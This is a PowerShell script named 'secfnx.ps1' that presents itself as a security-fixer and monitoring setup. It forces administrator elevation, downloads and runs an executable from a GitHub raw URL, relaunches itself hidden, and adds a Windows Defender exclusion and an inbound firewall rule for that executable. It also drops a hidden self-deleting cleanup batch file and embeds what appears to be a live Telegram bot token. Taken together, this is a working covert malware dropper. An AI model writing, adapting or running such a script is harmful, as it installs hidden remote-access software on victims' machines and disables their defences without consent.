# secfnx.ps1 - Fully hidden, self-contained monitoring setup
param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"
)

# --- Paths ---
$TempFolder   = Join-Path $env:TEMP "security_fixer"
if (-not (Test-Path $TempFolder)) { New-Item -Path $TempFolder -ItemType Directory -Force | Out-Null }
$ExeName      = "monitoring.exe"
$ExeUrl       = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/monitoring.exe"
$ExePath      = Join-Path $TempFolder $ExeName
$Ps1TempPath  = Join-Path $TempFolder "secfnx.ps1"
$BatPath      = Join-Path $TempFolder "secfix_un.bat"
$LogFile      = Join-Path $TempFolder "download_runner.log"

# --- Helper functions ---
function Log { param($msg) Add-Content -Path $LogFile -Value "$(Get-Date -Format o) - $msg" }

function Test-IsAdmin {
    try { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }
    catch { $false }
}

function Download-File($Url, $OutPath) {
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
        Log "Downloaded $Url -> $OutPath"
        return $true
    } catch {
        Log "Download failed: $_"
        return $false
    }
}

function Add-DefenderExclusion($Path) {
    if (-not (Test-IsAdmin)) { return }
    try { Add-MpPreference -ExclusionPath $Path -ErrorAction Stop; Log "Added Defender exclusion for $Path" } catch {}
}

function Add-FirewallRule($ExePath) {
    $RuleName = "MonitoringAppServer"
    if (-not (Get-NetFirewallRule -DisplayName $RuleName -ErrorAction SilentlyContinue)) {
        try {
            New-NetFirewallRule -DisplayName $RuleName -Direction Inbound -Program $ExePath -Action Allow -Profile Domain,Private,Public
            Log "Added Firewall rule for $ExePath"
        } catch {}
    }
}

# --- Elevate if not admin ---
if (-not (Test-IsAdmin)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSCommandPath`""; exit
}

# --- Download monitoring.exe ---
if (-not (Test-Path $ExePath)) { Download-File $ExeUrl $ExePath }

# --- Copy PS1 into TEMP if not already ---
if ($MyInvocation.MyCommand.Path -ne $Ps1TempPath) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $Ps1TempPath -Force
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$Ps1TempPath`""; exit
}

# --- Add Defender exclusion ---
Add-DefenderExclusion $TempFolder

# --- Add Firewall rule ---
Add-FirewallRule $ExePath

# --- Create uninstall batch ---
$BatContent = @"
@echo off
:: Relaunch hidden if run directly
if not defined IS_HIDDEN (
    start "" /min cmd /c "%~f0" IS_HIDDEN=1 %*
    exit /b
)

:DeleteFolder
rmdir /S /Q "%~1"
if exist "%~1" (
    timeout /t 3 /nobreak >nul
    goto DeleteFolder
)
exit /b

:DeleteFile
del /F /Q "%~1"
if exist "%~1" (
    timeout /t 3 /nobreak >nul
    goto DeleteFile
)
exit /b

:KillProcess
taskkill /F /IM "%~1" >nul 2>&1
tasklist /FI "IMAGENAME eq %~1" | find /I "%~1" >nul
if not errorlevel 1 (
    timeout /t 2 /nobreak >nul
    goto KillProcess
)
exit /b

:: Main cleanup
call :KillProcess monitoring.exe
call :DeleteFolder "%TEMP%\security_fixer"

:: Delete this batch file
del /F /Q "%~f0"
"@
Set-Content -Path $BatPath -Value $BatContent -Encoding ASCII
attrib +h $BatPath
Log "Created uninstall batch at $BatPath"

# --- Run monitoring.exe hidden ---
Start-Process -FilePath $ExePath -WindowStyle Hidden
Log "Started monitoring.exe hiddenly"

